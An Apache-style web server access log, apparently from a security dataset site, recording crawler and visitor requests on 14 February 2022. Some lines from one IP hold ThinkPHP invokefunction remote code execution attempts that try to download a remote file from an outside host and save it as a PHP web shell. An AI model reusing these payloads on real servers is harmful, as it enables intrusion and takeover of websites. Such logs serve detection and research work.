40.77.167.73 - - [14/Feb/2022:10:29:36 -0800] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 34507 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.145.137 - - [14/Feb/2022:10:33:13 -0800] "GET /self.logs/access.log.2020-11-29.gz HTTP/1.1" 200 14160 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
163.118.51.77 - - [14/Feb/2022:10:33:41 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
163.118.51.77 - - [14/Feb/2022:10:33:41 -0800] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
163.118.51.77 - - [14/Feb/2022:10:33:41 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
163.118.51.77 - - [14/Feb/2022:10:33:41 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
54.166.44.210 - - [14/Feb/2022:10:34:19 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420944 "-" "curl/7.79.1" 
123.125.109.34 - - [14/Feb/2022:10:40:11 -0800] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
71.163.45.235 - - [14/Feb/2022:10:41:46 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
71.163.45.235 - - [14/Feb/2022:10:41:46 -0800] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
71.163.45.235 - - [14/Feb/2022:10:41:46 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
71.163.45.235 - - [14/Feb/2022:10:41:46 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
71.163.45.235 - - [14/Feb/2022:10:41:49 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
114.119.149.218 - - [14/Feb/2022:11:04:27 -0800] "GET /self.logs/access.log.2020-11-28.gz HTTP/1.1" 200 12604 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.218 - - [14/Feb/2022:11:22:51 -0800] "GET /self.logs/access.log.2018-08-31.gz HTTP/1.1" 200 24031 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
52.90.130.118 - - [14/Feb/2022:11:30:06 -0800] "GET / HTTP/1.1" 200 13185 "-" "Iframely/1.3.1 (+https://iframely.com/docs/about) Atlassian" 
40.88.21.235 - - [14/Feb/2022:11:30:21 -0800] "GET / HTTP/1.1" 200 13185 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [14/Feb/2022:11:30:21 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
65.92.134.10 - - [14/Feb/2022:11:36:01 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
65.92.134.10 - - [14/Feb/2022:11:36:01 -0800] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
65.92.134.10 - - [14/Feb/2022:11:36:01 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
65.92.134.10 - - [14/Feb/2022:11:36:01 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
114.119.140.174 - - [14/Feb/2022:11:41:31 -0800] "GET /self.logs/access.log.2020-07-06.gz HTTP/1.1" 200 16206 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
17.121.112.171 - - [14/Feb/2022:11:43:41 -0800] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.112.171 - - [14/Feb/2022:11:43:41 -0800] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
51.222.253.2 - - [14/Feb/2022:11:50:26 -0800] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
93.78.190.3 - - [14/Feb/2022:12:13:13 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
93.78.190.3 - - [14/Feb/2022:12:13:14 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
93.78.190.3 - - [14/Feb/2022:12:13:14 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
93.78.190.3 - - [14/Feb/2022:12:13:14 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
93.78.190.3 - - [14/Feb/2022:12:13:15 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
103.37.3.58 - - [14/Feb/2022:12:21:37 -0800] "GET //?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 807 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:21:39 -0800] "GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:21:45 -0800] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:21:46 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:16 -0800] "GET //?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 805 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:17 -0800] "GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:22 -0800] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:23 -0800] "GET //?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 806 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:24 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:24 -0800] "GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:24 -0800] "GET //?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 805 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:25 -0800] "GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:26 -0800] "GET //?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 805 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:26 -0800] "GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:27 -0800] "GET //roeter.php HTTP/1.1" 301 494 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:27 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:30 -0800] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:31 -0800] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:31 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:31 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:41 -0800] "GET //?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 807 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:42 -0800] "GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13185 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:44 -0800] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.26.0" 
103.37.3.58 - - [14/Feb/2022:12:22:44 -0800] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.26.0" 
114.119.149.237 - - [14/Feb/2022:12:43:01 -0800] "GET /self.logs/access.log.2018-08-22.gz HTTP/1.1" 200 24992 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.23 - - [14/Feb/2022:12:49:17 -0800] "GET /self.logs/error.log.2018-10-25.gz HTTP/1.1" 200 4698 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
104.11.150.129 - - [14/Feb/2022:12:52:29 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
104.11.150.129 - - [14/Feb/2022:12:52:29 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
104.11.150.129 - - [14/Feb/2022:12:52:29 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
104.11.150.129 - - [14/Feb/2022:12:52:29 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
104.11.150.129 - - [14/Feb/2022:12:52:30 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
114.119.140.174 - - [14/Feb/2022:13:01:38 -0800] "GET /self.logs/error.log.2017-10-07.gz HTTP/1.1" 200 2792 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.237 - - [14/Feb/2022:13:07:44 -0800] "GET /self.logs/access.log.2020-04-07.gz HTTP/1.1" 200 16427 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
104.11.150.129 - - [14/Feb/2022:13:13:29 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1461 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
104.11.150.129 - - [14/Feb/2022:13:13:29 -0800] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
114.119.149.237 - - [14/Feb/2022:13:14:12 -0800] "GET /self.logs/access.log.2019-05-08.gz HTTP/1.1" 200 27122 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.23 - - [14/Feb/2022:13:20:20 -0800] "GET /self.logs/error.log.2017-06-13.gz HTTP/1.1" 200 1034 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.89.86 - - [14/Feb/2022:13:21:09 -0800] "GET /google30776e34d2e57a82.html HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)" 
51.222.253.12 - - [14/Feb/2022:13:26:38 -0800] "GET /Datasets%20Description/HTML_Bro_log_3/?C=N;O=A HTTP/1.1" 200 779 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
45.76.56.195 - - [14/Feb/2022:13:36:15 -0800] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
45.76.56.195 - - [14/Feb/2022:13:36:15 -0800] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
40.77.167.73 - - [14/Feb/2022:13:49:19 -0800] "GET /self.logs/access.log.2021-03-19.gz HTTP/1.1" 200 12873 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.89.86 - - [14/Feb/2022:13:50:18 -0800] "GET /googleb1a7c9cf768c32be.html HTTP/1.1" 200 444 "-" "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)" 
114.119.140.174 - - [14/Feb/2022:13:51:05 -0800] "GET /self.logs/access.log.2019-09-06.gz HTTP/1.1" 200 23635 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.218 - - [14/Feb/2022:13:57:21 -0800] "GET /self.logs/error.log.2020-10-11.gz HTTP/1.1" 200 908 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.145.137 - - [14/Feb/2022:14:09:48 -0800] "GET /self.logs/error.log.2017-01-04.gz HTTP/1.1" 200 4203 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
137.184.37.25 - - [14/Feb/2022:14:11:47 -0800] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
137.184.37.25 - - [14/Feb/2022:14:11:47 -0800] "GET / HTTP/1.0" 200 49096 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
114.119.149.23 - - [14/Feb/2022:14:15:57 -0800] "GET /self.logs/access.log.2019-10-03.gz HTTP/1.1" 200 25459 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
71.163.45.235 - - [14/Feb/2022:14:18:16 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1" 
114.119.149.218 - - [14/Feb/2022:14:22:06 -0800] "GET /self.logs/access.log.2020-08-19.gz HTTP/1.1" 200 25086 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.83.192 - - [14/Feb/2022:14:24:20 -0800] "GET /maccdc2012/ HTTP/1.1" 301 497 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
66.249.83.69 - - [14/Feb/2022:14:24:20 -0800] "GET /maccdc2012/ HTTP/1.1" 200 863 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
188.120.127.135 - - [14/Feb/2022:14:24:22 -0800] "GET / HTTP/1.1" 200 13148 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
191.243.177.71 - - [14/Feb/2022:14:24:22 -0800] "GET / HTTP/1.1" 301 438 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
177.36.1.69 - - [14/Feb/2022:14:24:22 -0800] "GET /maccdc2012 HTTP/1.1" 301 528 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
110.164.19.134 - - [14/Feb/2022:14:24:22 -0800] "GET /maccdc2012/ HTTP/1.1" 200 826 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
138.185.240.69 - - [14/Feb/2022:14:24:23 -0800] "GET /maccdc2012 HTTP/1.1" 301 458 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
188.120.127.135 - - [14/Feb/2022:14:24:23 -0800] "GET /css/style.css HTTP/1.1" 404 291 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
188.120.127.135 - - [14/Feb/2022:14:24:23 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7519 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
188.120.127.135 - - [14/Feb/2022:14:24:23 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27879 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
191.243.177.71 - - [14/Feb/2022:14:24:23 -0800] "GET / HTTP/1.1" 200 13148 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
177.36.1.69 - - [14/Feb/2022:14:24:23 -0800] "GET /maccdc2012/ HTTP/1.1" 200 826 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
138.185.240.69 - - [14/Feb/2022:14:24:24 -0800] "GET /maccdc2012 HTTP/1.1" 301 528 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
191.243.177.71 - - [14/Feb/2022:14:24:25 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27879 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
191.243.177.71 - - [14/Feb/2022:14:24:25 -0800] "GET /css/style.css HTTP/1.1" 404 291 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
191.243.177.71 - - [14/Feb/2022:14:24:25 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7519 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
138.185.240.69 - - [14/Feb/2022:14:24:25 -0800] "GET /maccdc2012/ HTTP/1.1" 200 826 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:26:10 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:26:10 -0800] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
114.119.149.237 - - [14/Feb/2022:14:28:06 -0800] "GET /self.logs/error.log.2017-08-01.gz HTTP/1.1" 200 1004 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.88.21.235 - - [14/Feb/2022:14:30:01 -0800] "GET / HTTP/1.1" 200 13185 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [14/Feb/2022:14:30:01 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
77.75.244.134 - - [14/Feb/2022:14:30:49 -0800] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:30:49 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:30:49 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:30:50 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
114.119.149.218 - - [14/Feb/2022:14:34:20 -0800] "GET /self.logs/error.log.2020-01-04.gz HTTP/1.1" 200 872 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.174 - - [14/Feb/2022:14:40:32 -0800] "GET /self.logs/2015/error.log.2015-07-02.gz HTTP/1.1" 200 903 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
54.186.161.10 - - [14/Feb/2022:14:46:57 -0800] "GET / HTTP/1.1" 301 475 "-" "-" 
54.186.161.10 - - [14/Feb/2022:14:46:57 -0800] "GET / HTTP/1.1" 200 49133 "-" "-" 
54.202.41.185 - - [14/Feb/2022:14:50:59 -0800] "GET / HTTP/1.1" 200 49089 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
77.75.244.134 - - [14/Feb/2022:14:51:32 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
114.119.149.23 - - [14/Feb/2022:14:53:05 -0800] "GET /self.logs/error.log.2017-08-07.gz HTTP/1.1" 200 950 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
